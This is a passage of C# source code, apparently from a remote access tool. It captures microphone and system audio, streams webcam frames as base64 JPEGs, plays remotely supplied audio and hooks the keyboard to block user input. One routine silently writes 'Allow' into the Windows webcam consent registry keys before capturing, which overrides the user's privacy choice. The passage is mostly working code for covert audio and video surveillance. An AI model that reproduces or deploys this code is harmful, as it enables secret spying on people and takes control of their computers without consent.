                long nextEmitTick = Environment.TickCount + 100;

                while (MicStreaming) {
                    DrainWasapiQueue(loopCap, sysRing, scratch);
                    DrainWasapiQueue(micCap, micRing, scratch);

                    if (hWaveIn != IntPtr.Zero) {
                        for (int i = 0; i < BUF_COUNT; i++) {
                            WAVEHDR cur = (WAVEHDR)Marshal.PtrToStructure(hdrPtrs[i], typeof(WAVEHDR));
                            if ((cur.dwFlags & 0x00000001u) != 0) {
                                int rec = (int)cur.dwBytesRecorded;
                                if (rec > 0 && rec <= CHUNK_BYTES) {
                                    Marshal.Copy(cur.lpData, waveInTmp, 0, rec);
                                    for (int b = 0; b < rec - 1; b += 2) {
                                        short s = (short)(waveInTmp[b] | (waveInTmp[b + 1] << 8));
                                        if (micRing.Count < 16000) micRing.Enqueue(s);
                                    }
                                }
                                cur.dwFlags &= ~0x00000001u;
                                cur.dwBytesRecorded = 0;
                                Marshal.StructureToPtr(cur, hdrPtrs[i], false);
                                waveInAddBuffer(hWaveIn, hdrPtrs[i], hdrSize);
                            }
                        }
                    }

                    long nowTick = Environment.TickCount;
                    if (nowTick - nextEmitTick >= 0) {
                        nextEmitTick = nowTick + 100;
                        string mode = AudioListenMode ?? "both";
                        bool useSys = (mode == "both" || mode == "system");
                        bool useMic = (mode == "both" || mode == "mic");

                        long sumSq = 0;
                        for (int i = 0; i < CHUNK_SAMPLES; i++) {
                            short sSys = 0;
                            short sMic = 0;
                            sysRing.TryDequeue(out sSys);
                            micRing.TryDequeue(out sMic);

                            int mixed = 0;
                            if (useSys && useMic) {
                                mixed = (int)Math.Round(sSys * 1.45 + sMic * 2.2);
                            } else if (useSys) {
                                mixed = (int)Math.Round(sSys * 1.55);
                            } else {
                                mixed = (int)Math.Round(sMic * 2.4);
                            }
                            if (mixed > 32767) mixed = 32767;
                            if (mixed < -32768) mixed = -32768;

                            short finalSample = (short)mixed;
                            sumSq += (long)finalSample * (long)finalSample;
                            outBytes[i * 2] = (byte)(finalSample & 0xFF);
                            outBytes[i * 2 + 1] = (byte)((finalSample >> 8) & 0xFF);
                        }

                        double rms = Math.Sqrt((double)sumSq / CHUNK_SAMPLES);
                        LastMicLevel = (int)Math.Min(100.0, Math.Round((rms / 5500.0) * 100.0));

                        while (MicQueue.Count > 12) {
                            string drop;
                            MicQueue.TryDequeue(out drop);
                        }
                        MicQueue.Enqueue(Convert.ToBase64String(outBytes, 0, CHUNK_BYTES));
                    }

                    if (waveInGetNumDevs() != initInDevs || waveOutGetNumDevs() != initOutDevs) {
                        break; // Hot-plug change detected -> rebind endpoints
                    }
                    Thread.Sleep(15);
                }
            } catch {}
            finally {
                if (pFmt != IntPtr.Zero) Marshal.FreeHGlobal(pFmt);
                if (loopClient != null) { try { loopClient.Stop(); } catch {} }
                if (micClient != null) { try { micClient.Stop(); } catch {} }
                if (loopCap != null) { try { Marshal.ReleaseComObject(loopCap); } catch {} }
                if (micCap != null) { try { Marshal.ReleaseComObject(micCap); } catch {} }
                if (loopClient != null) { try { Marshal.ReleaseComObject(loopClient); } catch {} }
                if (micClient != null) { try { Marshal.ReleaseComObject(micClient); } catch {} }
                if (loopDev != null) { try { Marshal.ReleaseComObject(loopDev); } catch {} }
                if (micDev != null) { try { Marshal.ReleaseComObject(micDev); } catch {} }
                if (enumerator != null) { try { Marshal.ReleaseComObject(enumerator); } catch {} }

                if (hWaveIn != IntPtr.Zero) {
                    try { waveInReset(hWaveIn); } catch {}
                    for (int i = 0; i < BUF_COUNT; i++) {
                        if (hdrPtrs[i] != IntPtr.Zero) {
                            try { waveInUnprepareHeader(hWaveIn, hdrPtrs[i], hdrSize); } catch {}
                        }
                    }
                    try { waveInClose(hWaveIn); } catch {}
                }
                for (int i = 0; i < BUF_COUNT; i++) {
                    if (hdrPtrs[i] != IntPtr.Zero) Marshal.FreeHGlobal(hdrPtrs[i]);
                    if (dataPtrs[i] != IntPtr.Zero) Marshal.FreeHGlobal(dataPtrs[i]);
                }
            }
            if (MicStreaming) Thread.Sleep(250);
        }
    }

    // ========================================================================
    // Windows Media Foundation Live Webcam Engine (640x360 JPEG Streaming)
    // ========================================================================
    [DllImport("mfplat.dll", ExactSpelling = true)]
    private static extern int MFStartup(int version, int dwFlags);
    [DllImport("mfplat.dll", ExactSpelling = true)]
    private static extern int MFShutdown();
    [DllImport("mfplat.dll", ExactSpelling = true)]
    private static extern int MFCreateAttributes(out IMFAttributes ppMFAttributes, uint cInitialSize);
    [DllImport("mfplat.dll", ExactSpelling = true)]
    private static extern int MFCreateMediaType(out IMFAttributes ppMFType);
    [DllImport("mf.dll", ExactSpelling = true)]
    private static extern int MFEnumDeviceSources(IMFAttributes pAttributes, out IntPtr pppSourceActivate, out uint pcSourceActivate);
    [DllImport("mfreadwrite.dll", ExactSpelling = true)]
    private static extern int MFCreateSourceReaderFromMediaSource([MarshalAs(UnmanagedType.IUnknown)] object pMediaSource, IMFAttributes pAttributes, out IMFSourceReader ppSourceReader);

    [ComImport, Guid("2CD2D921-C447-44A7-A13C-4ADABFC247E3"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IMFAttributes {
        int GetItem(ref Guid guidKey, IntPtr pValue);
        int GetItemType(ref Guid guidKey, out int pType);
        int CompareItem(ref Guid guidKey, IntPtr Value, out bool pbResult);
        int Compare(IMFAttributes pTheirs, int MatchType, out bool pbResult);
        int GetUINT32(ref Guid guidKey, out uint punValue);
        int GetUINT64(ref Guid guidKey, out ulong punValue);
        int GetDouble(ref Guid guidKey, out double pfValue);
        int GetGuid(ref Guid guidKey, out Guid pguidValue);
        int GetStringLength(ref Guid guidKey, out uint pcchLength);
        int GetString(ref Guid guidKey, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszValue, uint cchBufSize, out uint pcchLength);
        int GetAllocatedString(ref Guid guidKey, [MarshalAs(UnmanagedType.LPWStr)] out string ppwszValue, out uint pcchLength);
        int GetBlobSize(ref Guid guidKey, out uint pcbBlobSize);
        int GetBlob(ref Guid guidKey, [Out, MarshalAs(UnmanagedType.LPArray)] byte[] pBuf, uint cbBufSize, out uint pcbBlobSize);
        int GetAllocatedBlob(ref Guid guidKey, out IntPtr ip, out uint pcbSize);
        int GetUnknown(ref Guid guidKey, ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppv);
        int SetItem(ref Guid guidKey, IntPtr Value);
        int DeleteItem(ref Guid guidKey);
        int DeleteAllItems();
        int SetUINT32(ref Guid guidKey, uint unValue);
        int SetUINT64(ref Guid guidKey, ulong unValue);
        int SetDouble(ref Guid guidKey, double fValue);
        int SetGuid(ref Guid guidKey, ref Guid guidValue);
        int SetString(ref Guid guidKey, [MarshalAs(UnmanagedType.LPWStr)] string wszValue);
        int SetBlob(ref Guid guidKey, [In, MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] pBuf, uint cbBufSize);
        int SetUnknown(ref Guid guidKey, [MarshalAs(UnmanagedType.IUnknown)] object pUnknown);
        int LockStore();
        int UnlockStore();
        int GetCount(out uint pcItems);
        int GetItemByIndex(uint unIndex, out Guid pguidKey, IntPtr pValue);
        int CopyAllItems(IMFAttributes pDest);
    }

    [ComImport, Guid("7FEE9E9A-4A89-47a6-899C-B6A53A70FB67"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IMFActivate {
        int GetItem(ref Guid guidKey, IntPtr pValue);
        int GetItemType(ref Guid guidKey, out int pType);
        int CompareItem(ref Guid guidKey, IntPtr Value, out bool pbResult);
        int Compare(IMFAttributes pTheirs, int MatchType, out bool pbResult);
        int GetUINT32(ref Guid guidKey, out uint punValue);
        int GetUINT64(ref Guid guidKey, out ulong punValue);
        int GetDouble(ref Guid guidKey, out double pfValue);
        int GetGuid(ref Guid guidKey, out Guid pguidValue);
        int GetStringLength(ref Guid guidKey, out uint pcchLength);
        int GetString(ref Guid guidKey, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszValue, uint cchBufSize, out uint pcchLength);
        int GetAllocatedString(ref Guid guidKey, [MarshalAs(UnmanagedType.LPWStr)] out string ppwszValue, out uint pcchLength);
        int GetBlobSize(ref Guid guidKey, out uint pcbBlobSize);
        int GetBlob(ref Guid guidKey, [Out, MarshalAs(UnmanagedType.LPArray)] byte[] pBuf, uint cbBufSize, out uint pcbBlobSize);
        int GetAllocatedBlob(ref Guid guidKey, out IntPtr ip, out uint pcbSize);
        int GetUnknown(ref Guid guidKey, ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppv);
        int SetItem(ref Guid guidKey, IntPtr Value);
        int DeleteItem(ref Guid guidKey);
        int DeleteAllItems();
        int SetUINT32(ref Guid guidKey, uint unValue);
        int SetUINT64(ref Guid guidKey, ulong unValue);
        int SetDouble(ref Guid guidKey, double fValue);
        int SetGuid(ref Guid guidKey, ref Guid guidValue);
        int SetString(ref Guid guidKey, [MarshalAs(UnmanagedType.LPWStr)] string wszValue);
        int SetBlob(ref Guid guidKey, [In, MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] pBuf, uint cbBufSize);
        int SetUnknown(ref Guid guidKey, [MarshalAs(UnmanagedType.IUnknown)] object pUnknown);
        int LockStore();
        int UnlockStore();
        int GetCount(out uint pcItems);
        int GetItemByIndex(uint unIndex, out Guid pguidKey, IntPtr pValue);
        int CopyAllItems(IMFAttributes pDest);
        int ActivateObject(ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppv);
        int ShutdownObject();
        int DetachObject();
    }

    [ComImport, Guid("70ae66f2-c809-4e4f-8915-bdcb406b7993"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IMFSourceReader {
        int GetStreamSelection(uint dwStreamIndex, [MarshalAs(UnmanagedType.Bool)] out bool pfSelected);
        int SetStreamSelection(uint dwStreamIndex, [MarshalAs(UnmanagedType.Bool)] bool fSelected);
        int GetNativeMediaType(uint dwStreamIndex, uint dwMediaTypeIndex, out IMFAttributes ppMediaType);
        int GetCurrentMediaType(uint dwStreamIndex, out IMFAttributes ppMediaType);
        int SetCurrentMediaType(uint dwStreamIndex, IntPtr pdwReserved, IMFAttributes pMediaType);
        int SetCurrentPosition(ref Guid guidTimeFormat, IntPtr varPosition);
        int ReadSample(uint dwStreamIndex, uint dwControlFlags, out uint pdwActualStreamIndex, out uint pdwStreamFlags, out long pllTimestamp, out IMFSample ppSample);
        int Flush(uint dwStreamIndex);
        int GetServiceForStream(uint dwStreamIndex, ref Guid guidService, ref Guid riid, out IntPtr ppvObject);
        int GetPresentationAttribute(uint dwStreamIndex, ref Guid guidAttribute, IntPtr pvarAttribute);
    }

    [ComImport, Guid("c40a00f2-b93a-4d80-ae8c-5a1c634f58e4"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IMFSample {
        int GetItem(ref Guid guidKey, IntPtr pValue);
        int GetItemType(ref Guid guidKey, out int pType);
        int CompareItem(ref Guid guidKey, IntPtr Value, out bool pbResult);
        int Compare(IMFAttributes pTheirs, int MatchType, out bool pbResult);
        int GetUINT32(ref Guid guidKey, out uint punValue);
        int GetUINT64(ref Guid guidKey, out ulong punValue);
        int GetDouble(ref Guid guidKey, out double pfValue);
        int GetGuid(ref Guid guidKey, out Guid pguidValue);
        int GetStringLength(ref Guid guidKey, out uint pcchLength);
        int GetString(ref Guid guidKey, [Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pwszValue, uint cchBufSize, out uint pcchLength);
        int GetAllocatedString(ref Guid guidKey, [MarshalAs(UnmanagedType.LPWStr)] out string ppwszValue, out uint pcchLength);
        int GetBlobSize(ref Guid guidKey, out uint pcbBlobSize);
        int GetBlob(ref Guid guidKey, [Out, MarshalAs(UnmanagedType.LPArray)] byte[] pBuf, uint cbBufSize, out uint pcbBlobSize);
        int GetAllocatedBlob(ref Guid guidKey, out IntPtr ip, out uint pcbSize);
        int GetUnknown(ref Guid guidKey, ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppv);
        int SetItem(ref Guid guidKey, IntPtr Value);
        int DeleteItem(ref Guid guidKey);
        int DeleteAllItems();
        int SetUINT32(ref Guid guidKey, uint unValue);
        int SetUINT64(ref Guid guidKey, ulong unValue);
        int SetDouble(ref Guid guidKey, double fValue);
        int SetGuid(ref Guid guidKey, ref Guid guidValue);
        int SetString(ref Guid guidKey, [MarshalAs(UnmanagedType.LPWStr)] string wszValue);
        int SetBlob(ref Guid guidKey, [In, MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] pBuf, uint cbBufSize);
        int SetUnknown(ref Guid guidKey, [MarshalAs(UnmanagedType.IUnknown)] object pUnknown);
        int LockStore();
        int UnlockStore();
        int GetCount(out uint pcItems);
        int GetItemByIndex(uint unIndex, out Guid pguidKey, IntPtr pValue);
        int CopyAllItems(IMFAttributes pDest);
        int GetSampleFlags(out uint pdwSampleFlags);
        int SetSampleFlags(uint dwSampleFlags);
        int GetSampleTime(out long phnsSampleTime);
        int SetSampleTime(long hnsSampleTime);
        int GetSampleDuration(out long phnsSampleDuration);
        int SetSampleDuration(long hnsSampleDuration);
        int GetBufferCount(out uint pdwBufferCount);
        int GetBufferByIndex(uint dwIndex, out IMFMediaBuffer ppBuffer);
        int ConvertToContiguousBuffer(out IMFMediaBuffer ppBuffer);
    }

    [ComImport, Guid("045FA593-8799-42b8-BC8D-8968C6453507"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IMFMediaBuffer {
        int Lock(out IntPtr ppbBuffer, out uint pcbMaxLength, out uint pcbCurrentLength);
        int Unlock();
        int GetCurrentLength(out uint pcbCurrentLength);
        int SetCurrentLength(uint cbCurrentLength);
        int GetMaxLength(out uint pcbMaxLength);
    }

    public static ConcurrentQueue<string> WebcamQueue = new ConcurrentQueue<string>();
    public static volatile bool WebcamStreaming = false;
    private static Thread _webcamThread = null;
    private static bool _cachedHasWebcam = false;
    private static string _cachedWebcamName = "Khong co Camera";
    private static long _lastWebcamCheckTick = 0;

    public static void EnsureWebcamPrivacyAllowed() {
        string[] subKeys = new string[] {
            "Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam",
            "Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged"
        };
        foreach (string sk in subKeys) {
            try {
                using (RegistryKey k = Registry.CurrentUser.CreateSubKey(sk)) {
                    if (k != null) k.SetValue("Value", "Allow", RegistryValueKind.String);
                }
            } catch {}
            try {
                using (RegistryKey k = Registry.LocalMachine.CreateSubKey(sk)) {
                    if (k != null) k.SetValue("Value", "Allow", RegistryValueKind.String);
                }
            } catch {}
        }
    }

    public static object[] GetWebcamStatus() {
        long now = Environment.TickCount;
        if (_lastWebcamCheckTick == 0 || (now - _lastWebcamCheckTick > 15000)) {
            _lastWebcamCheckTick = now;
            try {
                if (MFStartup(0x00020070, 0) == 0) {
                    IMFAttributes attr;
                    if (MFCreateAttributes(out attr, 1) == 0 && attr != null) {
                        Guid kSourceType = new Guid("C60AC5FE-252A-478F-A0EF-BC8FA5F7CAD3");
                        Guid vVidcap = new Guid("8AC3587A-4AE7-42D8-99E0-0A6013EEF90F");
                        attr.SetGuid(ref kSourceType, ref vVidcap);
                        IntPtr ppDevices = IntPtr.Zero;
                        uint count = 0;
                        if (MFEnumDeviceSources(attr, out ppDevices, out count) == 0 && count > 0) {
                            Guid kFriendlyName = new Guid("60D0E559-52F8-4FA2-BBCE-ACDB34A8EC01");
                            string bestName = null;
                            for (int i = 0; i < count; i++) {
                                IntPtr pAct = Marshal.ReadIntPtr(ppDevices, i * IntPtr.Size);
                                var act = (IMFAttributes)Marshal.GetObjectForIUnknown(pAct);
                                string name;
                                uint cch;
                                if (act.GetAllocatedString(ref kFriendlyName, out name, out cch) == 0 && !string.IsNullOrEmpty(name)) {
                                    if (bestName == null || !name.ToUpper().Contains("IR ")) {
                                        bestName = name;
                                    }
                                }
                                Marshal.Release(pAct);
                            }
                            _cachedHasWebcam = true;
                            _cachedWebcamName = bestName ?? "USB / Integrated Camera";
                        } else {
                            _cachedHasWebcam = false;
                            _cachedWebcamName = "Khong co Camera";
                        }
                        if (ppDevices != IntPtr.Zero) Marshal.FreeCoTaskMem(ppDevices);
                        Marshal.ReleaseComObject(attr);
                    }
                    MFShutdown();
                }
            } catch {}
        }
        return new object[] { _cachedHasWebcam, _cachedWebcamName, WebcamStreaming };
    }

    public static void StartWebcamStream() {
        EnsureWebcamPrivacyAllowed();
        WebcamStreaming = true;
        if (_webcamThread == null || !_webcamThread.IsAlive) {
            _webcamThread = new Thread(WebcamWorkerLoop);
            _webcamThread.IsBackground = true;
            _webcamThread.Start();
        }
    }

    public static void StopWebcamStream() {
        WebcamStreaming = false;
        string dummy;
        while (WebcamQueue.TryDequeue(out dummy)) {}
    }

    public static string DequeueWebcamFrame() {
        string frame;
        if (WebcamQueue.TryDequeue(out frame)) return frame;
        return null;
    }

    private static void WebcamWorkerLoop() {
        while (WebcamStreaming) {
            EnsureWebcamPrivacyAllowed();
            bool mfStarted = false;
            IMFActivate chosenAct = null;
            object mediaSource = null;
            IMFSourceReader reader = null;
            try {
                if (MFStartup(0x00020070, 0) != 0) {
                    Thread.Sleep(1000);
                    continue;
                }
                mfStarted = true;

                IMFAttributes attr;
                MFCreateAttributes(out attr, 1);
                Guid kSourceType = new Guid("C60AC5FE-252A-478F-A0EF-BC8FA5F7CAD3");
                Guid vVidcap = new Guid("8AC3587A-4AE7-42D8-99E0-0A6013EEF90F");
                attr.SetGuid(ref kSourceType, ref vVidcap);

                IntPtr ppDevices = IntPtr.Zero;
                uint count = 0;
                if (MFEnumDeviceSources(attr, out ppDevices, out count) != 0 || count == 0) {
                    if (ppDevices != IntPtr.Zero) Marshal.FreeCoTaskMem(ppDevices);
                    Marshal.ReleaseComObject(attr);
                    Thread.Sleep(1000);
                    continue;
                }

                Guid kFriendlyName = new Guid("60D0E559-52F8-4FA2-BBCE-ACDB34A8EC01");
                int chosenIdx = 0;
                for (int i = 0; i < count; i++) {
                    IntPtr pAct = Marshal.ReadIntPtr(ppDevices, i * IntPtr.Size);
                    var actTmp = (IMFAttributes)Marshal.GetObjectForIUnknown(pAct);
                    string name;
                    uint cch;
                    if (actTmp.GetAllocatedString(ref kFriendlyName, out name, out cch) == 0 && !string.IsNullOrEmpty(name)) {
                        if (!name.ToUpper().Contains("IR ")) {
                            chosenIdx = i;
                        }
                    }
                }

                IntPtr chosenPtr = Marshal.ReadIntPtr(ppDevices, chosenIdx * IntPtr.Size);
                chosenAct = (IMFActivate)Marshal.GetObjectForIUnknown(chosenPtr);
                for (int i = 0; i < count; i++) {
                    if (i != chosenIdx) {
                        IntPtr pAct = Marshal.ReadIntPtr(ppDevices, i * IntPtr.Size);
                        Marshal.Release(pAct);
                    }
                }
                Marshal.FreeCoTaskMem(ppDevices);
                Marshal.ReleaseComObject(attr);

                if (chosenAct == null) {
                    Thread.Sleep(1000);
                    continue;
                }

                Guid iidMediaSource = new Guid("279a808d-aec7-40c8-9c6b-a6b492c78a66");
                if (chosenAct.ActivateObject(ref iidMediaSource, out mediaSource) != 0 || mediaSource == null) {
                    Thread.Sleep(1000);
                    continue;
                }

                IMFAttributes rdrAttr;
                MFCreateAttributes(out rdrAttr, 2);
                Guid kEnableProc = new Guid("FB394F3D-CCF1-42EE-BBB3-F9B845D5681D");
                rdrAttr.SetUINT32(ref kEnableProc, 1);

                if (MFCreateSourceReaderFromMediaSource(mediaSource, rdrAttr, out reader) != 0 || reader == null) {
                    Marshal.ReleaseComObject(rdrAttr);
                    Thread.Sleep(1000);
                    continue;
                }
                Marshal.ReleaseComObject(rdrAttr);

                uint FIRST_VIDEO = 0xFFFFFFFCu;
                IMFAttributes outType;
                MFCreateMediaType(out outType);
                Guid kMajor = new Guid("48eba18e-f8c9-4687-bf11-0a74c9f96a8f");
                Guid vVideo = new Guid("73646976-0000-0010-8000-00AA00389B71");
                Guid kSub = new Guid("f7e34c9a-42e8-4714-b74b-cb29d72c35e5");
                Guid vRGB32 = new Guid("00000016-0000-0010-8000-00AA00389B71");
                outType.SetGuid(ref kMajor, ref vVideo);
                outType.SetGuid(ref kSub, ref vRGB32);
                reader.SetCurrentMediaType(FIRST_VIDEO, IntPtr.Zero, outType);
                Marshal.ReleaseComObject(outType);

                IMFAttributes curType;
                reader.GetCurrentMediaType(FIRST_VIDEO, out curType);
                Guid kFrameSize = new Guid("1652c33d-d6b2-4012-b834-72030849a37d");
                ulong frameSize = 0;
                curType.GetUINT64(ref kFrameSize, out frameSize);
                int w = (int)(frameSize >> 32);
                int h = (int)(frameSize & 0xFFFFFFFF);
                Guid kStride = new Guid("644b4e48-1e02-4516-b0eb-c01ca9d49ac6");
                uint uStride = 0;
                int hrS = curType.GetUINT32(ref kStride, out uStride);
                int stride = (hrS == 0 && uStride != 0) ? (int)uStride : (w * 4);
                Marshal.ReleaseComObject(curType);

                if (w <= 0 || h <= 0) {
                    Thread.Sleep(1000);
                    continue;
                }

                ImageCodecInfo jpegCodec = null;
                foreach (ImageCodecInfo c in ImageCodecInfo.GetImageEncoders()) {
                    if (c.MimeType == "image/jpeg") { jpegCodec = c; break; }
                }
                EncoderParameters encParams = new EncoderParameters(1);
                encParams.Param[0] = new EncoderParameter(Encoder.Quality, 65L);

                int absStride = Math.Abs(stride);
                byte[] rowBuf = new byte[w * 4];
                int failCount = 0;

                while (WebcamStreaming && failCount < 25) {
                    uint streamIdx, flags;
                    long ts;
                    IMFSample sample = null;
                    int hr = reader.ReadSample(FIRST_VIDEO, 0, out streamIdx, out flags, out ts, out sample);
                    if (hr == 0 && sample != null) {
                        failCount = 0;
                        IMFMediaBuffer buf = null;
                        try {
                            if (sample.ConvertToContiguousBuffer(out buf) == 0 && buf != null) {
                                IntPtr pData;
                                uint maxLen, curLen;
                                if (buf.Lock(out pData, out maxLen, out curLen) == 0) {
                                    if (curLen >= (uint)(absStride * h) && pData != IntPtr.Zero) {
                                        using (Bitmap bmpSrc = new Bitmap(w, h, PixelFormat.Format32bppRgb)) {
                                            BitmapData bd = bmpSrc.LockBits(new Rectangle(0, 0, w, h), ImageLockMode.WriteOnly, PixelFormat.Format32bppRgb);
                                            int copyLen = Math.Min(rowBuf.Length, Math.Min(absStride, Math.Abs(bd.Stride)));
                                            for (int y = 0; y < h; y++) {
                                                int srcY = (stride < 0) ? (h - 1 - y) : y;
                                                IntPtr srcRow = new IntPtr(pData.ToInt64() + (long)srcY * absStride);
                                                IntPtr dstRow = new IntPtr(bd.Scan0.ToInt64() + (long)y * bd.Stride);
                                                Marshal.Copy(srcRow, rowBuf, 0, copyLen);
                                                Marshal.Copy(rowBuf, 0, dstRow, copyLen);
                                            }
                                            bmpSrc.UnlockBits(bd);

                                            int outW = 640;
                                            int outH = Math.Max(240, (int)Math.Round(640.0 * h / w));
                                            using (Bitmap bmpOut = new Bitmap(bmpSrc, new Size(outW, outH)))
                                            using (MemoryStream ms = new MemoryStream()) {
                                                if (jpegCodec != null) {
                                                    bmpOut.Save(ms, jpegCodec, encParams);
                                                } else {
                                                    bmpOut.Save(ms, ImageFormat.Jpeg);
                                                }
                                                while (WebcamQueue.Count > 2) {
                                                    string drop;
                                                    WebcamQueue.TryDequeue(out drop);
                                                }
                                                WebcamQueue.Enqueue(Convert.ToBase64String(ms.ToArray()));
                                            }
                                        }
                                    }
                                    buf.Unlock();
                                }
                            }
                        } catch {}
                        finally {
                            if (buf != null) { try { Marshal.ReleaseComObject(buf); } catch {} }
                            try { Marshal.ReleaseComObject(sample); } catch {}
                        }
                        Thread.Sleep(150); // ~6.5 FPS
                    } else {
                        if (sample != null) { try { Marshal.ReleaseComObject(sample); } catch {} }
                        failCount++;
                        Thread.Sleep(60);
                    }
                }
            } catch {}
            finally {
                if (reader != null) { try { Marshal.ReleaseComObject(reader); } catch {} }
                if (chosenAct != null) {
                    try { chosenAct.ShutdownObject(); } catch {}
                    try { Marshal.ReleaseComObject(chosenAct); } catch {}
                }
                if (mediaSource != null) { try { Marshal.ReleaseComObject(mediaSource); } catch {} }
                if (mfStarted) { try { MFShutdown(); } catch {} }
            }
            if (WebcamStreaming) Thread.Sleep(500);
        }
    }

    public static void PlayPcmB64(string b64) {
        if (string.IsNullOrEmpty(b64)) return;
        try {
            byte[] raw = Convert.FromBase64String(b64);
            if (raw == null || raw.Length == 0) return;
            while (SpkQueue.Count > 24) {
                byte[] drop;
                SpkQueue.TryDequeue(out drop);
            }
            SpkQueue.Enqueue(raw);
            if (_spkThread == null || !_spkThread.IsAlive) {
                _spkThread = new Thread(SpeakerWorkerLoop);
                _spkThread.IsBackground = true;
                _spkThread.Start();
            }
        } catch {}
    }

    private static void SpeakerWorkerLoop() {
        const int RING_SIZE = 12;
        uint hdrSize = (uint)Marshal.SizeOf(typeof(WAVEHDR));
        IntPtr hWaveOut = IntPtr.Zero;
        IntPtr[] hdrPtrs = new IntPtr[RING_SIZE];
        IntPtr[] dataPtrs = new IntPtr[RING_SIZE];
        int[] capSizes = new int[RING_SIZE];
        bool[] prepared = new bool[RING_SIZE];
        int ringIdx = 0;
        uint lastOutDevs = 0;
        int idleLoops = 0;

        try {
            while (idleLoops < 400) {
                byte[] chunk;
                if (!SpkQueue.TryDequeue(out chunk)) {
                    idleLoops++;
                    Thread.Sleep(15);
                    continue;
                }
                idleLoops = 0;
                uint curOutDevs = waveOutGetNumDevs();
                if (curOutDevs == 0) {
                    Thread.Sleep(200);
                    continue;
                }

                // Hot-plug detection or initial open
                if (hWaveOut == IntPtr.Zero || curOutDevs != lastOutDevs) {
                    if (hWaveOut != IntPtr.Zero) {
                        try { waveOutReset(hWaveOut); } catch {}
                        for (int i = 0; i < RING_SIZE; i++) {
                            if (prepared[i] && hdrPtrs[i] != IntPtr.Zero) {
                                try { waveOutUnprepareHeader(hWaveOut, hdrPtrs[i], hdrSize); } catch {}
                                prepared[i] = false;
                            }
                        }
                        try { waveOutClose(hWaveOut); } catch {}
                        hWaveOut = IntPtr.Zero;
                    }
                    WAVEFORMATEX fmt = new WAVEFORMATEX();
                    fmt.wFormatTag = 1;
                    fmt.nChannels = 1;
                    fmt.nSamplesPerSec = 16000;
                    fmt.wBitsPerSample = 16;
                    fmt.nBlockAlign = 2;
                    fmt.nAvgBytesPerSec = 32000;
                    fmt.cbSize = 0;

                    if (waveOutOpen(out hWaveOut, 0xFFFFFFFFu, ref fmt, IntPtr.Zero, IntPtr.Zero, 0) != 0 || hWaveOut == IntPtr.Zero) {
                        waveOutOpen(out hWaveOut, 0u, ref fmt, IntPtr.Zero, IntPtr.Zero, 0);
                    }
                    lastOutDevs = curOutDevs;
                    if (hWaveOut == IntPtr.Zero) {
                        Thread.Sleep(200);
                        continue;
                    }
                }

                int slot = ringIdx % RING_SIZE;
                ringIdx++;
                if (hdrPtrs[slot] == IntPtr.Zero) {
                    hdrPtrs[slot] = Marshal.AllocHGlobal((int)hdrSize);
                    Marshal.Copy(new byte[(int)hdrSize], 0, hdrPtrs[slot], (int)hdrSize);
                } else if (prepared[slot]) {
                    WAVEHDR prev = (WAVEHDR)Marshal.PtrToStructure(hdrPtrs[slot], typeof(WAVEHDR));
                    int waitCnt = 0;
                    while ((prev.dwFlags & 0x00000001u) == 0 && waitCnt < 20) {
                        Thread.Sleep(10);
                        prev = (WAVEHDR)Marshal.PtrToStructure(hdrPtrs[slot], typeof(WAVEHDR));
                        waitCnt++;
                    }
                    try { waveOutUnprepareHeader(hWaveOut, hdrPtrs[slot], hdrSize); } catch {}
                    prepared[slot] = false;
                }

                if (dataPtrs[slot] == IntPtr.Zero || capSizes[slot] < chunk.Length) {
                    if (dataPtrs[slot] != IntPtr.Zero) Marshal.FreeHGlobal(dataPtrs[slot]);
                    capSizes[slot] = Math.Max(chunk.Length, 6400);
                    dataPtrs[slot] = Marshal.AllocHGlobal(capSizes[slot]);
                }

                Marshal.Copy(chunk, 0, dataPtrs[slot], chunk.Length);
                WAVEHDR h = new WAVEHDR();
                h.lpData = dataPtrs[slot];
                h.dwBufferLength = (uint)chunk.Length;
                h.dwFlags = 0;
                Marshal.StructureToPtr(h, hdrPtrs[slot], false);

                if (waveOutPrepareHeader(hWaveOut, hdrPtrs[slot], hdrSize) == 0) {
                    prepared[slot] = true;
                    if (waveOutWrite(hWaveOut, hdrPtrs[slot], hdrSize) != 0) {
                        lastOutDevs = 0; // force reopen on next chunk
                    }
                }
            }
        } catch {}
        finally {
            if (hWaveOut != IntPtr.Zero) {
                try { waveOutReset(hWaveOut); } catch {}
                for (int i = 0; i < RING_SIZE; i++) {
                    if (prepared[i] && hdrPtrs[i] != IntPtr.Zero) {
                        try { waveOutUnprepareHeader(hWaveOut, hdrPtrs[i], hdrSize); } catch {}
                    }
                }
                try { waveOutClose(hWaveOut); } catch {}
            }
            for (int i = 0; i < RING_SIZE; i++) {
                if (hdrPtrs[i] != IntPtr.Zero) Marshal.FreeHGlobal(hdrPtrs[i]);
                if (dataPtrs[i] != IntPtr.Zero) Marshal.FreeHGlobal(dataPtrs[i]);
            }
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            KBDLLHOOKSTRUCT hookStruct = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
            bool isInjected = (hookStruct.flags & 0x10) != 0;
            if (!isInjected && BlockKb) {
                return (IntPtr)1;
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
